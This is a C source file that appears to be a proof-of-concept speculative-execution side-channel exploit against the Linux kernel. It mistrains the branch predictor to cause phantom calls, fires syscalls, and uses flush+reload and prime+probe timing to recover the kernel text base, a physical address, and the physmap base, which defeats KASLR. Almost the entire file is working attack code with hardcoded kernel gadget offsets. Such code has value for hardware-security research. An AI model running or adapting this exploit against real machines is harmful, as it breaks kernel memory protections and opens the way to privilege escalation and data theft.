#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <time.h>
#include <sched.h>
#include <errno.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <signal.h>
#include <setjmp.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include "phys.h"

#define HUGEPAGE 2097152
#define ROUNDS 25000
#define PTRN 0xffff800800000000
#define SETS     1024
#define WAYS     8

#define str(s) #s
#define xstr(s) str(s)

uint64_t training_jmp;
uint64_t training_call;
uint64_t victim_phantom_call;
int fd;
char fifo[1024];


static inline double elapsed_sec(struct timespec a,
                                 struct timespec b)
{    return (double)(b.tv_sec - a.tv_sec) +
           (double)(b.tv_nsec - a.tv_nsec) * 1e-9;
}

void set_training_addrs(uint64_t jmp_loc, uint64_t call_loc){
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *)(training_jmp & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *)(training_call & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);

    *(uint32_t *)training_jmp = 0x00e0ff41; //jmp *%r8
    *(uint32_t *)training_call = 0x00d0ff41; //call *%r8
}

void unset_training_addrs(){
    munmap((void *)(training_jmp & ~0xfff), 8192);
    munmap((void *)(training_call & ~0xfff), 8192);
}

static inline void insert_p_jmp(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_jmp): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline void insert_p_call(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_call): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile ("CPUID\n\t"
            "RDTSC\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t" : "=r" (hi), "=r" (lo)::
            "%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t"
            "CPUID\n\t": "=r" (hi), "=r" (lo):: "%rax",
            "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void flush(unsigned long addr) {
    __asm__ volatile("clflushopt (%0)\n"::"r"(addr));
    __asm__ volatile("clflushopt (%0)\n"::"r"(addr));
}

int compare(const void *a, const void *b) {
    uint64_t ua = *(const uint64_t *)a;
    uint64_t ub = *(const uint64_t *)b;
    return (ua > ub) - (ua < ub);
}

static inline __attribute__((always_inline)) uint64_t reload(unsigned long offset){
    __asm__ volatile("mfence\n");
    unsigned volatile char *p = (uint8_t *)offset;
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *)p;
    uint64_t dt = rdtscp() - t0;
    return dt;
}

int start_interrupts(){
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) {
        perror("timerfd_create");
        exit(1);
    }

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    struct itimerspec ts = {0};
    ts.it_value = now;
    ts.it_interval.tv_nsec = 5000;

    timerfd_settime(tfd, TFD_TIMER_ABSTIME, &ts, NULL);

    return tfd;
}

void prepare_core(int core){
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }

    snprintf(fifo, sizeof(fifo), "logs/core%d", core % 8);

    int fdout = open(fifo, O_WRONLY);
    if (fdout < 0) { perror("open"); exit(1); }

    dup2(fdout, STDOUT_FILENO);
    dup2(fdout, STDERR_FILENO);
    close(fdout);

    setvbuf(stdout, NULL, _IONBF, 0);
}

void trigger_syscalls(int tfd, uint64_t r13, uint64_t r14){
    uint64_t exp;
    int ret;

    for(int i = 0; i < 1; i++){
        asm volatile(
            "syscall"
            : "=a"(ret)
            : "a"(0),
            "D"(tfd),
            "S"(&exp),
            "d"(8)
            : "rcx","r11","r10","r8","r9","memory", "r12", "r13", "r14"
        );

        for(int j = 0; j < 1; j++){
            insert_p_call();
            insert_p_jmp();


            for(int l = 0; l < 7; l++){

                    asm volatile(
                        "syscall"
                        : "=a"(ret)
                        : "a"(1),
                        "D"(0xaaaaaaaaaaaaaa00), "S"(r13), "d"(r14)
                        : "rcx","r11","r10","r8","r9","memory"
                    );
            }
        }
    }
}

uint64_t find_physical_addr(uint64_t base, uint64_t _text){
    pid_t pids[CORES];

    int fd_comm[2];
    pipe(fd_comm);

    for(int core = 0; core < CORES; core++){        
	    pids[core] = fork();
	
        if(pids[core] == 0){
            prepare_core(core);
            uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;

            int blocks_per_core = phys_blocks.nblocks / CORES;
            int remainder = phys_blocks.nblocks % CORES;
            
            set_training_addrs(_text + 0x123e, _text + 0x4d7233 - 3);

            int tfd = start_interrupts();

            uint64_t cycles[ROUNDS] = {0};

            int start = core * blocks_per_core + (core < remainder ? core : remainder);
            int end = (core + 1) * blocks_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

	    while(1){
            for (int block = start; block < end; block++) {
		//printf("Block %d / %d\n", block, end);
    	    for (uint64_t k = phys_blocks.blocks[block] * phys_blocks.block_size;
                    k < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                    k += HUGEPAGE) {
         
           		    for (int i = 0; i < ROUNDS/100; i++) {
                            flush(base + core_offset);
                            for(int j = 0; j < 10; j++) trigger_syscalls(tfd, k + core_offset, 0x0);
                            cycles[i] = reload(base + core_offset);
                        }

                    qsort(cycles, ROUNDS / 100, sizeof(uint64_t), compare);

                    printf(".");
                    // printf("Lowest cycle = %lu (guess = %p)\n", cycles[0], (void *)k);
                    fflush(stdout);

                    if(cycles[0] < 150){
                        close(fd_comm[0]);
                        write(fd_comm[1], &k, sizeof(k));
                        printf("\nPhysical address found: %p\n", (void *)k);
                        fflush(stdout);
                        _exit(0);
                    }
                }
            }
		}

            //while(1){}
        }
    }

    int status;
    pid_t finished_pid = wait(&status); 

    for (int i = 0; i < CORES; i++) {
        if (pids[i] > 0) {
            kill(pids[i], SIGKILL);
            waitpid(pids[i], NULL, 0);
        }
    }

    uint64_t physical_addr = -1;
    close(fd_comm[1]);
    read(fd_comm[0], &physical_addr, sizeof(physical_addr));

    return physical_addr;
}

uint64_t find_physmap(uint64_t base, uint64_t phys, uint64_t _text){
    pid_t pids[CORES] = {0};

    int fd_comm[2];
    pipe(fd_comm);

    for(int core = 0; core < CORES; core++){        
	    pids[core] = fork();
	
        if(pids[core] == 0){
            prepare_core(core);
            uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;
            
            set_training_addrs(_text + 0x123e, _text + 0x14f24f2 - 3);

            int tfd = start_interrupts();

            for(int block = 0; block < 9; block++){
                uint64_t range_per_core = 13369 / CORES;
                uint64_t remainder = 13369 % CORES;
                
                uint64_t cycles[ROUNDS] = {0};

                uint64_t start = core * range_per_core + (core < remainder ? core : remainder);
                uint64_t end = (core + 1) * range_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

                uint64_t start_addr = 0xffff888000000000 + (block * 13369 + start) * 0x40000000;
                uint64_t end_addr = 0xffff888000000000 + (block * 13369 + end) * 0x40000000;

                for (uint64_t physmap_guess = start_addr; physmap_guess < end_addr; physmap_guess += 0x40000000){

                    for (int i = 0; i < ROUNDS / 5; i++) {
                        flush(base + core_offset);
                        
                        trigger_syscalls(tfd, physmap_guess + phys + core_offset - 0x20, physmap_guess + phys + core_offset - 0x20);
                    
                        cycles[i] = reload(base + core_offset);
                    }

                    qsort(cycles, ROUNDS / 5, sizeof(uint64_t), compare);

                    // printf("CORE %d: Lowest cycle = %lu (guess = %p)\n", core, cycles[0], (void *)physmap_guess);
                    printf(".");
                    fflush(stdout);

                    int low = 0;
                    for(int b = 0; b < ROUNDS / 5; b++){
                        if(cycles[b] < 150) low++;
                    }

                    if(cycles[0] < 150){
                        close(fd_comm[0]);
                        write(fd_comm[1], &physmap_guess, sizeof(physmap_guess));
                        printf("\nPhysmap found: %p\n", (void *)physmap_guess);
                        fflush(stdout);
                        _exit(0);
                    }
                }

                // printf("Done with block %d\n", block);
            }

            while(1){}
        }
    }

    int status;
    pid_t finished_pid = wait(&status); 

    for (int i = 0; i < CORES; i++) {
        if (pids[i] > 0) {
            kill(pids[i], SIGKILL);
            waitpid(pids[i], NULL, 0);
        }
    }

    uint64_t physmap = -1;
    close(fd_comm[1]);
    read(fd_comm[0], &physmap, sizeof(physmap));

    return physmap;
}

int64_t prime_probe_guess(uint64_t guess, int set, uint64_t start, int tfd) {
    uint64_t dt[2 * 100] = {0};

    set_training_addrs(guess + 0x123e, guess + 0x14aac0f - 3);

    for (int i = 0; i < 100; i++) {
        for (uint64_t l = 0; l < 2; l++) {
            
            void *goal = l == 0 ? (void *) guess + (((set + 2) % SETS) * 0x40)
                                    : (void *) guess + (set * 0x40);
            void *goal2 = l == 0 ? (void *) guess + 0x200000 + (((set + 2) % SETS) * 0x40)
                        : (void *)guess + 0x200000 + (set * 0x40);

            volatile uint64_t *curr = (uint64_t *) start;
            for (int k = 0; k < 7; k++) {
                curr = (uint64_t *) *curr;
            }

            for(int j = 0; j < 75; j++) trigger_syscalls(tfd, (uint64_t)goal, (uint64_t)goal2);

            curr = (uint64_t *) start;
            
            uint64_t t0 = rdtsc();
            for (int k = 0; k < 7; k++) {
                curr = (uint64_t *) *curr;
            }

            uint64_t dtt = rdtscp() - t0;
            dt[100 * l + i] = dtt;
        }
    }

    unset_training_addrs();

    qsort(dt, 100, sizeof(uint64_t), compare);
    qsort(&dt[100], 100, sizeof(uint64_t), compare);

    uint64_t tail = dt[79];

    int64_t a = 0;
    int64_t b = 0;
    for(int i = 0; i < 100; i++){
        if(dt[i] > tail) a++;
        if(dt[100 + i] > tail) b++;
    }

    return b - a;
}

void get_addrs(uint64_t *buf, uint64_t set, int n, uint64_t base) {
    for (int i = 0; i < n; i++) {
        uint64_t c = (7 * i + 12) & (n - 1);
        buf[i] = ((((((uint64_t) base) >> 16) + c) << 10) + set) << 6;
        if (i > 0)
            *((uint64_t *) buf[i - 1]) = buf[i];
    }

    *((uint64_t *) buf[n - 1]) = buf[0];
}

uint64_t find_text() {
    pid_t pids[CORES] = {0};
    int fd_comm[2];
    pipe(fd_comm);

    for(int core = 0; core < CORES; core++){        
        pids[core] = fork();
	
        if(pids[core] == 0){
        
            prepare_core(core);

            uint64_t base = (uint64_t)aligned_alloc(HUGEPAGE, HUGEPAGE);
            madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);
            mprotect((void *)base, HUGEPAGE, PROT_READ|PROT_WRITE|PROT_EXEC);

            *(volatile int *)base = 0x778 + (core * 0x777);

            sleep(1);

            int blocks_per_core = 488 / CORES;
            int remainder = 488 % CORES;

            int start = core * blocks_per_core + (core < remainder ? core : remainder);
            int end = (core + 1) * blocks_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

            uint64_t addrs[SETS * WAYS];
            for (int i = 0; i < SETS; i++) {
                get_addrs(addrs + (WAYS * i), i, WAYS, base);
            }

            int tfd = start_interrupts();

            int round = -1;

            while (1) {
                round++;

                srand(time(NULL) * core);

                int rando[32];
                for(int j = 0; j < 16; j++) rando[j] = rand() % SETS;


                uint64_t guess = 0xffffffff81000000 + start * 0x200000;
                while(1){
                    // printf("%p (%d / %d)\n", (void *)guess, (guess - 0xffffffff81000000) / (0x200000 * 1), 488);
                    printf(".");
                    fflush(stdout);

                    int attempt = 0;
                    while(1){                        
                        int64_t total_score = 0;
                        for(int j = 0; j < 16; j++){
                            total_score += prime_probe_guess(guess, rando[j], addrs[rando[j] * (WAYS * 1)], tfd);
                        }
                        // printf("Total score: %ld\n", total_score);
                        // fflush(stdout);
                            
                        if(total_score < 25){
                            break;
                        }

                        if(attempt > 8){
                            printf("\n_text found: %p\n", (void *)guess);
                            fflush(stdout);

                            close(fd_comm[0]);
                            write(fd_comm[1], &guess, sizeof(guess));
                            _exit(0);
                        }

                        attempt++; 
                    }
                    
                    guess += (1 * 0x200000);
                    if(guess >= 0xffffffff81000000 + 488 * 0x200000) guess = 0xffffffff81000000;
                }
            }

            while(1){}
        }        
    }

    int status;
    pid_t finished_pid = wait(&status); 
    
    if (finished_pid > 0) {
	//printf("Child %d finished. I'm moving on now!\n", finished_pid);
    }

    for (int i = 0; i < CORES; i++) {
        if (pids[i] > 0) {
            kill(pids[i], SIGKILL);
            waitpid(pids[i], NULL, 0);
        }
    }

    uint64_t _text = -1;
    close(fd_comm[1]);
    read(fd_comm[0], &_text, sizeof(_text));

    return _text;

}

int main() {
    srand(time(NULL));

    phys_blocks_init();
    
    uint64_t base = (uint64_t)aligned_alloc(HUGEPAGE, HUGEPAGE);
	madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);

    sleep(1);

    for(int j = 0; j < 512; j++) *(volatile uint64_t *)(base + 4096 * j) = 0xAAAAAAAAAAAAAAAA + j;

    madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);

    sleep(1);

    struct timespec start, end;

    clock_gettime(CLOCK_MONOTONIC, &start); 
    uint64_t _text = find_text();
    clock_gettime(CLOCK_MONOTONIC, &end);

    printf("\nFound _text: %p (%.6f seconds)\n", (void *)_text, elapsed_sec(start, end));
    fflush(stdout);

    clock_gettime(CLOCK_MONOTONIC, &start); 
    uint64_t phys = find_physical_addr(base, _text);
    clock_gettime(CLOCK_MONOTONIC, &end);

    printf("\nFound physical: %p (%.6f seconds)\n", (void *)phys, elapsed_sec(start, end));
    fflush(stdout);

    clock_gettime(CLOCK_MONOTONIC, &start); 
    uint64_t physmap = find_physmap(base, phys, _text);
    clock_gettime(CLOCK_MONOTONIC, &end);

    printf("\nFound physmap: %p (%.6f seconds)\n", (void *)physmap, elapsed_sec(start, end));
    fflush(stdout);

    return 0;
}
